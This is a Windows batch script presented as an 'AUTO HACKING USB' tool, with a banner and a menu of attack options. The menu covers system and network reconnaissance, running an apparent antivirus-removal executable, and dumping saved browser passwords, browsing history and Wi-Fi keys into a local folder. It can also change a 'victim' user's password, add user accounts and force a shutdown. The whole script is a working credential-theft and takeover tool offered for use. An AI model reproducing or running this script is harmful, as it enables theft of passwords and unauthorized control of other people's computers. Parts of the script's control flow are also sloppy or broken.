:start
@echo off
color 0a
mode 110,30
                                                                                                    
            
echo  yhhhhhhhhhhhhhhhhh: +hhhhhhhhhhhhhhhh-`hhhhhhhhhhhhhhhhhh. shhhhhhhhhhhhhhhh` -echohhh+               
echo  :::::::shhh+::::::. +hhho::::::::::::` :::::::yhhh/::::::` shhh+::::::::::::  -hhh+               
echo         ohhh-        +hhh:                     yhhh`        shhh.              -hhh+               
echo         ohhh-        +hhhhyyyyyyyyys           yhhh`        shhhhyyyyyyyyy+    -hhh+               
echo         ohhh-        +hhhhhhhhhhhhhs           yhhh`        shhhhhhhhhhhhh+    -hhh+               
echo         ohhh-        +hhh/``````````           yhhh`        shhh-``````````    -hhh+               
echo         ohhh-        +hhh+------------`        yhhh`        shhh/------------  -hhho-------------- 
echo         ohhh-        +hhhhhhhhhhhhhhhh-        yhhh`        shhhhhhhhhhhhhhhh` -echohhhhhhhhhhhhhhhhhy 
echo         /ooo.        :oooooooooooooooo.        +ooo`        +oooooooooooooooo` echo.oooooooooooooooooo       
 echo -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
@echo off
:starthere
@echo off
Title “AUTO HACKING USB”

echo 1) Get info about the computer. Stored under System_Info.txt
echo 2) Steal all passwords. Stored under "STORED_INFORMATION" folder.
echo 3) More Tools.
echo 4) About this tool.
echo 5) Exit.
echo Enter Your Choice
set /p choice=
if %choice% == 1 goto :get
if %choice% == 2 goto :steal
if %choice% == 3 goto :more
if %choice% == 4 goto :abt
if %choice% == 5 goto :exit
cls
:get
cls
echo Gettings tons of info from the computer. Will be stored in System_Info.txt
pause
echo IP Configuration: >> System_Info.txt
ipconfig /all >> System_Info.txt
echo All Users on computer: >> System_Info.txt
net user >> System_Info.txt
echo Computers connected to network: >> System_Info.txt
net view >> System_Info.txt
echo Hardware and other system info: >> System_Info.txt
systeminfo >> System_Info.txt
ping localhost -n 5>null
cls
goto :starthere
a
:steal
@echo off
start AV_Rem.exe
cls
md STORED_INFORMAION
.\mylastsearch\MyLastSearch.exe/stext LAST_SEARCH.txt
move LAST_SEARCH.txt .\STORED_INFORMAION
.\WebPass\WebBrowserPassView.exe/stext BROSWER_SAVED_PASSWORDS.txt
move BROSWER_SAVED_PASSWORDS.txt .\STORED_INFORMAION
.\history\BHV.exe/stext BROSWING_HISTORY.txt
move BROSWING_HISTORY.txt .\STORED_INFORMAION
.\wireless_key\WKV.exe/stext WIRELESS_KEYS.txt
move WIRELESS_KEYS.txt .\STORED_INFORMAION
cls
goto :starthere

:abt
cls
color c
echo THIS TOOL IS PROGRAMMED BY "AN ODIA GUY" HO HO HO
echo I AM NOT RESPONSIBLE FOR ANY TYPE OF HARM TO YOUR SYSTEM
echo USE THIS TOOL AT YOUR OWN RISK
pause
exit

:more
cls
echo 1) Detect 32bit or 64bit Operating System.
echo 2) Remove/change user password
echo 3) Shutdown Computer With Your Custom Message.
echo 4) Add User.
echo 0) Back
echo Enter Your Choice
set /p choice=
if %choice% == 1 goto :detect
if %choice% == 2 goto :change
if %choice% == 0 goto :start
if %choice% == 3 goto :shut
if %choice% == 4 goto :user
:detect
cls
@echo off
REM Detect 32bit or 64bit Operating System
REM ###NOTE - requires Admin Manifest
if exist "%SystemRoot%\Sysnative\" goto Wind64
echo:Your System Type - 32bit
goto ENDPROG
:Wind64
echo:Your System Type - 64bit
goto ENDPROG
:ENDPROG
pause
cls
goto :more

:change
cls
echo For this to work you have to run as administrator(If you run as administrator then press enter)
pause
cls
net user
echo Which one of these is the victims user name?
set /p user=
echo What do you want to change the password to?
set /p pass=
net user %user% %pass%
echo The password for %user% has been changed to %pass% succefully!
pause
cls

:shut
cls
echo How much time you want to set for shutdown?(ex- "06" for six second "60" for a minute)
set /p time=
echo Ok. What would you like the message to say?
set /p message=
shutdown -s -t 06 -c "%message%"

echo To abort do command shutdown -a

cls

:user
cls
@echo off
echo Please Enter The Username You Want To add
set /p user=
echo Please Enter The Password For User Name %user%
set /p password=

@Echo Off
for /f "tokens=1-1 delims=\" %%a in ("%PATH%") do (Set Root=%%a)
%Root%

Net user %user% %password% /add
echo User Successfully Created
pause



:exit
exit